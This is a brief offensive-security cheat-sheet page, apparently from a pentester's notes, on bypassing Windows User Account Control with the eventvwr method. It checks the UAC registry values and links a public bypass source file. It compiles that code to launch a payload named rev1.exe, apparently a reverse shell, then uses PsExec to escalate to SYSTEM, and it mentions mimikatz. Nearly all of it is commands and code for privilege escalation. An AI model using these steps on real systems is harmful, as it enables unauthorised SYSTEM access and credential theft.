# UAC eventvwr

{% embed url="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/" %}
eventvwr
{% endembed %}

### Check if UAC is On

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

ConsentPromptBehaviorAdmin    REG_DWORD    0x5
EnableLUA    REG_DWORD    0x1
PromptOnSecureDesktop    REG_DWORD    0x1
```

{% hint style="info" %}
1. `EnableLUA` tells us whether UAC is enabled. If 0 we don’t need to bypass it at all can just PsExec to SYSTEM. If it’s 1 however, then check the other 2 keys
2. `ConsentPromptBehaviorAdmin` can theoretically take on [6 possible values](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4) (readable explanation [here](https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html)), but from configuring the UAC slider in Windows settings it takes on either 0, 2 or 5.
3. `PromptOnSecureDesktop` is binary, either 0 or 1.
{% endhint %}

#### When 2. & 3. is default or lower ( not work when `ConsentPromptBehaviorAdmin` = 2 and `PromptOnSecureDesktop` = 1)

{% embed url="https://github.com/k4sth4/UAC-bypass" %}

```
https://github.com/turbo/zero2hero/raw/master/main.c

GetCurrentDirectory(MAX_PATH, curPath);
strcat(curPath, "\\rev1.exe");

x86_64-w64-mingw32-gcc main.c -o 64.exe
64.exe -c rev1.exe
>>can use mimi alrdy
PSexec with high integrity shell to system 
PsExec64.exe -accepteula -d -s C:\rev2.exe
```
